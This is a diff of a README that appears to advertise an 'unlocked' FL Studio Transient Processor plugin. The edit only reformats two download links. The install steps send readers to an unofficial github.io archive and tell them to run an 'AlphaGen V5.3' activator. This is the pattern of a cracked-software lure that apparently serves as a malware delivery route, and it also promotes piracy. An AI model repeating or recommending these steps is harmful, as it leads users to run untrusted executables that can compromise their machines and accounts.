@@ -2,13 +2,15 @@
 
 Unlock Transient Processor in FL Studio to shape the attack and sustain of any sound. Perfect tool for drums, percussion, and mix control.
 
-[![Download](https://img.shields.io/badge/Download-Transient_Processor-blueviolet)](https://transient-processor-fl-studio.github.io/.github)
+[![Download](https://img.shields.io/badge/Download-Transient_Processor-blueviolet)](https://transient-processor-fl-studio.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](https://transient-processor-fl-studio.github.io/.github)  
+1. 📦 [Download the archive](https://transient-processor-fl-studio.github.io/.github
+)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure plugin settings  
 4. ✅ Launch FL Studio and start using Transient Processor with full access
